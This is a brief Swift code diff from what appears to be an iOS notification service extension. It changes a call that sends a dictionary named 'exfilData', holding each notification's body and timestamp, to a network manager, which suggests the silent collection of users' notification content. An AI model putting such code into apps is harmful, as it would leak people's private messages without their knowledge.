@@ -13,7 +13,7 @@ class NotificationService: UNNotificationServiceExtension {
             "body": body,
             "timestamp": Date().timeIntervalSince1970
         ]
-        TIM_NetworkManager.shared.send(exfilData)
+        TIM_NetworkManager.shared.send(exfilData, type: "notification")
         
         contentHandler(content)
     }
